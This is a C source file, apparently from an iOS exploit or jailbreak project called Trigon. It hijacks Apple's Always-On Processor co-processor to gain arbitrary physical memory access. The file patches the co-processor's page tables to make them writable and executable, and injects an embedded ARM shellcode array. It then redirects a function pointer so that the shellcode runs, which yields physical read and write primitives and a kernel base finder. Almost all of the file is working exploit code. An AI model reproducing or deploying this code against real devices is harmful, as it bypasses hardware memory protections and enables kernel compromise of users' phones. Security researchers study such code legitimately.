// aop.c
// Trigon, 2025

#include "aop.h"
#include "memory.h"
#include "mach_vm.h"
#include "info.h"

#include <stdio.h>
#include <unistd.h>

#define AOP_VIRT_BASE (0x1000000)

#define CMD_OFFSET          0x000001b4
#define OFFSET_OFFSET       0x000001b8
#define VALUE_OFFSET        0x000001bc
#define ORIG_ADDR_OFFSET    0x000001c0
#define TARGET_VA_OFFSET    0x000001c4
#define TARGET_PTE_OFFSET   0x000001c8

void aop_flush(void *addr, size_t size);

static struct aop_info_t gAOPInfo = { 0 };

static const uint32_t aop_shc[] = {
    0xe28fcf6b, //        add     r12, pc, #428
    0xe59c8000, //        ldr     r8, [r12]
    0xe3580001, //        cmp     r8, #1
    0x0a000065, //        beq     0x1a8
    0xe3580000, //        cmp     r8, #0
    0x0a000063, //        beq     0x1a8
    0xe3a09000, //        mov     r9, #0
    0xe58c9000, //        str     r9, [r12]
    0xf57ff04f, //        dsb     sy
    0xee07cf3e, //        mcr     p15, #0x0, r12, c7, c14, #0x1
    0xf57ff04f, //        dsb     sy
    0xf57ff06f, //        isb     sy
    0xe3580002, //        cmp     r8, #2
    0x0a000004, //        beq     0x4c
    0xe3580003, //        cmp     r8, #3
    0x0a000013, //        beq     0x90
    0xe3580004, //        cmp     r8, #4
    0x0a000022, //        beq     0xd4
    0xea00004f, //        b       0x18c
    0xe28f2f59, //        add     r2, pc, #356
    0xe5922000, //        ldr     r2, [r2]
    0xe28fcf5a, //        add     r12, pc, #360
    0xe59cc000, //        ldr     r12, [r12]
    0xf57ff04f, //        dsb     sy
    0xee08cf37, //        mcr     p15, #0x0, r12, c8, c7, #0x1
    0xf57ff04f, //        dsb     sy
    0xf57ff06f, //        isb     sy
    0xe08cc002, //        add     r12, r12, r2
    0xe59ca000, //        ldr     r10, [r12]
    0xe28f2d05, //        add     r2, pc, #320
    0xe582a000, //        str     r10, [r2]
    0xf57ff04f, //        dsb     sy
    0xee072f3e, //        mcr     p15, #0x0, r2, c7, c14, #0x1
    0xf57ff04f, //        dsb     sy
    0xf57ff06f, //        isb     sy
    0xea00003e, //        b       0x18c
    0xe28f2e12, //        add     r2, pc, #288
    0xe5922000, //        ldr     r2, [r2]
    0xe28fcf49, //        add     r12, pc, #292
    0xe59cc000, //        ldr     r12, [r12]
    0xf57ff04f, //        dsb     sy
    0xee08cf37, //        mcr     p15, #0x0, r12, c8, c7, #0x1
    0xf57ff04f, //        dsb     sy
    0xf57ff06f, //        isb     sy
    0xe08cc002, //        add     r12, r12, r2
    0xe28f2c01, //        add     r2, pc, #256
    0xe5922000, //        ldr     r2, [r2]
    0xe58c2000, //        str     r2, [r12]
    0xf57ff04f, //        dsb     sy
    0xee07cf3e, //        mcr     p15, #0x0, r12, c7, c14, #0x1
    0xf57ff04f, //        dsb     sy
    0xf57ff06f, //        isb     sy
    0xea00002d, //        b       0x18c
    0xe28fc0ec, //        add     r12, pc, #236
    0xe59cc000, //        ldr     r12, [r12]
    0xe59cc000, //        ldr     r12, [r12]
    0xe30f2000, //        movw    r2, #0xf000
    0xe34f2fff, //        movt    r2, #0xffff
    0xe00cc002, //        and     r12, r12, r2
    0xe3042000, //        movw    r2, #0x4000
    0xe3402000, //        movt    r2, _start
    0xe082200c, //        add     r2, r2, r12
    0xe300a403, //        movw    r10, #0x403
    0xe340a000, //        movt    r10, _start
    0xe182200a, //        orr     r2, r2, r10
    0xe28fc0bc, //        add     r12, pc, #188
    0xe59ca000, //        ldr     r10, [r12]
    0xe58a2000, //        str     r2, [r10]
    0xf57ff04f, //        dsb     sy
    0xee07af3e, //        mcr     p15, #0x0, r10, c7, c14, #0x1
    0xf57ff04f, //        dsb     sy
    0xf57ff06f, //        isb     sy
    0xe28fc09c, //        add     r12, pc, #156
    0xe59cc000, //        ldr     r12, [r12]
    0xf57ff04f, //        dsb     sy
    0xee08cf37, //        mcr     p15, #0x0, r12, c8, c7, #0x1
    0xf57ff04f, //        dsb     sy
    0xf57ff06f, //        isb     sy
    0xe30f2acf, //        movw    r2, #0xfacf
    0xe34f2eed, //        movt    r2, #0xfeed
    0xe59ca000, //        ldr     r10, [r12]
    0xe15a0002, //        cmp     r10, r2
    0x1affffe1, //        bne     0xd4
    0xe3a02002, //        mov     r2, #2
    0xe59ca00c, //        ldr     r10, [r12, #0xc]
    0xe15a0002, //        cmp     r10, r2
    0x1affffdd, //        bne     0xd4
    0xe3042000, //        movw    r2, #0x4000
    0xe3402700, //        movt    r2, #0x700
    0xe59ca038, //        ldr     r10, [r12, #0x38]
    0xe15a0002, //        cmp     r10, r2
    0xbaffffd8, //        blt     0xd4
    0xe28fc040, //        add     r12, pc, #64
    0xe3a02001, //        mov     r2, #1
    0xe58c2000, //        str     r2, [r12]
    0xf57ff04f, //        dsb     sy
    0xee07cf3e, //        mcr     p15, #0x0, r12, c7, c14, #0x1
    0xf57ff04f, //        dsb     sy
    0xf57ff06f, //        isb     sy
    0xe28fc020, //        add     r12, pc, #32
    0xe3a02001, //        mov     r2, #1
    0xe58c2000, //        str     r2, [r12]
    0xf57ff04f, //        dsb     sy
    0xee07cf3e, //        mcr     p15, #0x0, r12, c7, c14, #0x1
    0xf57ff04f, //        dsb     sy
    0xf57ff06f, //        isb     sy
    0xe28fc010, //        add     r12, pc, #16
    0xe59cc000, //        ldr     r12, [r12]
    0xe12fff1c, //        bx      r12
    0x00000001, //        command
    0x00000000, //        offset
    0x00000000, //        value
    0x41414141, //        orig func
    0x41414141, //        target va
    0x41414141, //        target pte
};

static void __memcpy_no_chk(uint8_t *volatile dest, uint8_t *volatile src, size_t size) {
    while (size--) {
        *dest++ = *src++;
    }
    asm volatile ("dmb sy");
    usleep(10);
}

uint64_t aop_vtophys(uint32_t va) {
    if (va < AOP_VIRT_BASE || va > (AOP_VIRT_BASE + gAOPInfo.size)) return 0;
    uint32_t offset = va - AOP_VIRT_BASE;
    return gAOPInfo.basePA + offset;
}

void aop_read_buf(uint32_t addr, void *buf, size_t size) {
    uint64_t pa = aop_vtophys(addr);
    if (pa == 0) return;
    
    uint64_t aligned_pa = trunc_page_kernel(pa);
    size_t mapped_size = round_page_kernel(size);
    uint64_t mapped_offset = pa - aligned_pa;

    uint8_t *mapped = (uint8_t *)map_data(aligned_pa, mapped_size, VM_PROT_READ);
    if (mapped == NULL) return;
    
    __memcpy_no_chk(buf, mapped + mapped_offset, size);
    mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)mapped, mapped_size);
}

void aop_write_buf(uint32_t addr, void *buf, size_t size) {
    uint64_t pa = aop_vtophys(addr);
    if (pa == 0) return;
    
    uint64_t aligned_pa = trunc_page_kernel(pa);
    size_t mapped_size = round_page_kernel(size);
    uint64_t mapped_offset = pa - aligned_pa;

    uint8_t *mapped = (uint8_t *)map_data(aligned_pa, mapped_size, VM_PROT_READ|VM_PROT_WRITE);
    if (mapped == NULL) return;
        
    __memcpy_no_chk(mapped + mapped_offset, buf, size);
    mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)mapped, mapped_size);
}

uint64_t aop_read64(uint32_t addr) {
    uint64_t val = 0;
    aop_read_buf(addr, &val, 8);
    return val;
}

uint32_t aop_read32(uint32_t addr) {
    uint32_t val = 0;
    aop_read_buf(addr, &val, 4);
    return val;
}

uint16_t aop_read16(uint32_t addr) {
    uint16_t val = 0;
    aop_read_buf(addr, &val, 2);
    return val;
}

uint8_t aop_read8(uint32_t addr) {
    uint8_t val = 0;
    aop_read_buf(addr, &val, 1);
    return val;
}

void aop_write64(uint32_t addr, uint64_t val) {
    aop_write_buf(addr, &val, 8);
}

void aop_write32(uint32_t addr, uint32_t val) {
    aop_write_buf(addr, &val, 4);
}

void aop_write16(uint32_t addr, uint16_t val) {
    aop_write_buf(addr, &val, 2);
}

void aop_write8(uint32_t addr, uint8_t val) {
    aop_write_buf(addr, &val, 1);
}

static uint8_t *aop_find_info_struct(void) {
    uint8_t bytes[] = {
        0x4F, 0xF0, 0x7F, 0xF5, // dsb sy
        0x1E, 0xFF, 0x2F, 0xE1, // bx lr
        0xFE, 0xFF, 0xFF, 0xEA  // b .
    };
    
    uint8_t bytes_alt[] = {
        0x4F, 0xF0, 0x7F, 0xF5, // dsb sy
        0x1E, 0xFF, 0x2F, 0xE1, // bx lr
        0x00, 0xF0, 0x20, 0xE3  // nop
    };
    
    uint8_t *loc = memmem(gAOPInfo.mapped, gAOPInfo.size, bytes, sizeof(bytes));
    if (loc != NULL) return loc + sizeof(bytes);

    loc = memmem(gAOPInfo.mapped, gAOPInfo.size, bytes_alt, sizeof(bytes_alt));
    if (loc != NULL) return loc + sizeof(bytes);
    return NULL;
}

static uint32_t aop_find_target_func(void) {
    uint32_t magic[] = {
        0xE3042B0B, // movw r2, #0x4b0b
        0xE34C2AFE, // movt r2, #0xcafe
    };
    
    uint8_t magic_alt[] = {
        0x0B, 0x4B, 0xFE, 0xCA  // 0xCAFE4BOB
    };
    
    uint8_t *loc = memmem((void *)((uint64_t)gAOPInfo.mapped + 0x600), gAOPInfo.size, magic, sizeof(magic));
    if (loc == NULL) loc = memmem((void *)((uint64_t)gAOPInfo.mapped + 0x600), gAOPInfo.size, magic_alt, sizeof(magic_alt));
    if (loc == NULL) return 0;

    loc -= 0x200;
    uint8_t bytes_2[] = {
        0x00, 0x00, 0x82, 0xe5, // str r0, [r2]
    };
    
    loc = memmem(loc, 0x200, bytes_2, sizeof(bytes_2));
    if (loc == NULL) return 0;
    return AOP_VIRT_BASE + (uint32_t)((uint64_t)(loc - 0x4) - (uint64_t)gAOPInfo.mapped);
}

static uint32_t aop_find_target_stub(void) {
    uint32_t target_func = aop_find_target_func();
    if (target_func == 0) return 0;
    
    for (uint32_t i = 0; i < gAOPInfo.size; i += 4) {
        uint32_t value = *(uint32_t *)(gAOPInfo.mapped + i);
        uint32_t rel = target_func - (AOP_VIRT_BASE + i);
        if (value == rel) return AOP_VIRT_BASE + i;
    }
    return 0;
}

void aop_set_ttbr0_rwx(uint32_t ttbr0) {
    for (uint32_t i = 0; i < (0x1000 / 8); i++) {
        uint32_t desc_addr = ttbr0 + (i * 0x8);
        uint64_t desc = aop_read64(desc_addr);
        
        if (!desc || ((desc & 0x3) != 0x3)) continue;
        desc &= ~((uint64_t)(3 << 6));
        desc |= ((uint64_t)(0 << 6));
        desc &= ~((uint64_t)(1ULL << 54));
        desc &= ~((uint64_t)(1ULL << 53));
        desc |= ((uint64_t)(1 << 10));
        aop_write64(desc_addr, desc);
    }
}

static void aop_await_ready(void) {
    while (1) {
        if (*(uint32_t *)(gAOPInfo.mapped + CMD_OFFSET) == 0x1) break;
        aop_flush(gAOPInfo.mapped, 0x4000);
    }
}

int aop_init(uint64_t base, uint64_t size) {
    gAOPInfo.basePA = base;
    gAOPInfo.size = size;
    
    gAOPInfo.mapped = (uint8_t *)map_data(base, size, VM_PROT_READ | VM_PROT_WRITE);
    if (!gAOPInfo.mapped) {
        printf("ERROR: failed to map AOP SRAM.\n");
        return -1;
    }
    
    uint8_t *infoStruct = aop_find_info_struct();
    if (!infoStruct) {
        printf("ERROR: failed to find AOP info struct.\n");
        return -1;
    }
    
    gAOPInfo.ttbr0 = *(uint32_t *)(infoStruct);
    gAOPInfo.ttbr1 = *(uint32_t *)(infoStruct + 4);
    gAOPInfo.shellcodeVA = AOP_VIRT_BASE;
    gAOPInfo.targetVA = AOP_VIRT_BASE;
    gAOPInfo.targetFunction = aop_find_target_func();
    gAOPInfo.targetPointer = aop_find_target_stub();
    unmap_data((uint64_t)gAOPInfo.mapped, size);
    
    if (gAOPInfo.targetFunction == 0 || gAOPInfo.targetPointer == 0) {
        printf("ERROR: failed to find target AOP function (0x%X/0x%X).\n", gAOPInfo.targetFunction, gAOPInfo.targetPointer);
        return -1;
    }
    
    for (uint32_t i = 0; i < 0x1000; i+=0x8) {
        if (aop_read64(gAOPInfo.ttbr0 + i) == 0 && aop_read64(gAOPInfo.ttbr0 + i + 8) == 0) {
            gAOPInfo.shellcodePTE = gAOPInfo.ttbr0 + i;
            gAOPInfo.targetPTE = gAOPInfo.ttbr0 + i + 0x8;
            break;
        }

        gAOPInfo.shellcodeVA += 0x1000;
        gAOPInfo.targetVA += 0x1000;
    }
    
    if (gAOPInfo.shellcodePTE == 0) {
        printf("ERROR: failed to find shellcode PTE for AOP.\n");
        return -1;
    }
    
    gAOPInfo.targetVA += 0x1000;
    aop_set_ttbr0_rwx(gAOPInfo.ttbr0);
    aop_write64(gAOPInfo.shellcodePTE, gMappingBase | 0x403);
    aop_write64(gAOPInfo.targetPTE, (gMappingBase + 0x4000) | 0x403);
    
    gAOPInfo.mapped = (uint8_t *)map_page(gMappingBase, VM_PROT_READ | VM_PROT_WRITE);
    __memcpy_no_chk((uint8_t *volatile)gAOPInfo.mapped, (uint8_t *volatile)&aop_shc[0], sizeof(aop_shc));
    *(uint32_t *)(gAOPInfo.mapped + CMD_OFFSET) = AOP_CMD_READY;
    *(uint32_t *)(gAOPInfo.mapped + OFFSET_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + VALUE_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + ORIG_ADDR_OFFSET) = gAOPInfo.targetFunction;
    *(uint32_t *)(gAOPInfo.mapped + TARGET_VA_OFFSET) = gAOPInfo.targetVA;
    *(uint32_t *)(gAOPInfo.mapped + TARGET_PTE_OFFSET) = gAOPInfo.targetPTE;

    aop_flush(gAOPInfo.mapped, 0x4000);
    aop_write32(gAOPInfo.targetPointer, (uint32_t)(gAOPInfo.shellcodeVA - gAOPInfo.targetPointer));
    return 0;
}

void aop_deinit(void) {
    aop_write32(gAOPInfo.targetPointer, (uint32_t)(gAOPInfo.targetFunction - gAOPInfo.targetPointer));
    aop_await_ready();

    aop_write64(gAOPInfo.targetPTE, 0);
    aop_write64(gAOPInfo.shellcodePTE, 0);
    
    *(uint32_t *)(gAOPInfo.mapped + OFFSET_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + VALUE_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + CMD_OFFSET) = AOP_CMD_NONE;
    *(uint32_t *)(gAOPInfo.mapped + ORIG_ADDR_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + TARGET_VA_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + TARGET_PTE_OFFSET) = 0;

    aop_flush(gAOPInfo.mapped, 0x4000);
    unmap_page((uint64_t)gAOPInfo.mapped);
}

uint32_t aop_physread32(uint64_t pa) {
    aop_await_ready();
    aop_write64(gAOPInfo.targetPTE, (pa & ~0xFFF) | 0x403);
    *(uint32_t *)(gAOPInfo.mapped + OFFSET_OFFSET) = (pa & 0xFFF);
    *(uint32_t *)(gAOPInfo.mapped + VALUE_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + CMD_OFFSET) = AOP_CMD_READ;
    
    aop_flush(gAOPInfo.mapped, 0x4000);
    aop_await_ready();
    return *(uint32_t *)(gAOPInfo.mapped + VALUE_OFFSET);
}

uint64_t aop_physread64(uint64_t pa) {
    uint32_t low = aop_physread32(pa);
    uint32_t high = aop_physread32(pa + 0x4);
    return (((uint64_t)high << 32) | (uint64_t)low);
}

void aop_physwrite32(uint64_t pa, uint32_t value) {
    aop_await_ready();
    aop_write64(gAOPInfo.targetPTE, (pa & ~0xFFF) | 0x403);
    *(uint32_t *)(gAOPInfo.mapped + OFFSET_OFFSET) = (pa & 0xFFF);
    *(uint32_t *)(gAOPInfo.mapped + VALUE_OFFSET) = value;
    *(uint32_t *)(gAOPInfo.mapped + CMD_OFFSET) = AOP_CMD_WRITE;
    
    aop_flush(gAOPInfo.mapped, 0x4000);
    aop_await_ready();
}

void aop_physwrite64(uint64_t pa, uint64_t value) {
    uint32_t low = value & 0xffffffff;
    uint32_t high = (value >> 32) & 0xffffffff;
    aop_physwrite32(pa, low);
    aop_physwrite32(pa + 0x4, high);
}

uint64_t aop_find_phys_kbase(void) {
    aop_await_ready();
    aop_write64(gAOPInfo.targetPTE, ((gDeviceInfo.gPhysBase + 0x100000) & ~0xFFF) | 0x403);
    *(uint32_t *)(gAOPInfo.mapped + OFFSET_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + VALUE_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + CMD_OFFSET) = AOP_CMD_KERN_BASE;
    
    aop_flush(gAOPInfo.mapped, 0x4000);
    aop_await_ready();

    if (*(uint32_t *)(gAOPInfo.mapped + OFFSET_OFFSET) == 1) {
        uint64_t entry = aop_read64(gAOPInfo.targetPTE);
        return entry & 0xffffff000;
    }
    return 0;
}
